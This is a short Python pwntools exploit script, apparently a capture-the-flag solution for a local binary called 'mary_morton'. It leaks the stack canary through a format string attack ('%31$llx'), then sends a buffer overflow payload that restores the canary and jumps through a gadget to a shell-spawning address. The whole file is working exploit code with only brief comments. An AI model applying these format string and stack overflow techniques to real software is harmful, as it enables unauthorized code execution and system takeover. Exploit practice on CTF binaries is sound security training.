from pwn import *
import time

target = process('./mary_morton')
print(target.recvuntil(b"Exit the battle"))
target.sendline(b"2")
time.sleep(1)

# use a string format attack to print a long stored in memory
target.sendline(b"canary:%31$llx")
print(target.recvuntil(b"canary:"))
# store the leaked canary
canary_init = target.recvline()
canary = p64(int(b"0x" + canary_init[:16], 16))

# store locations of valuable instructions to pop shell
popR15R14 = p64(0x400ab0)
shell = p64(0x4008da)
target.sendline(b"1")
time.sleep(1)

# send payload
target.sendline(b"A" * 136 + canary + b"A" * 8 + popR15R14 + p64(0x0) + p64(0x0) + shell)

target.interactive()
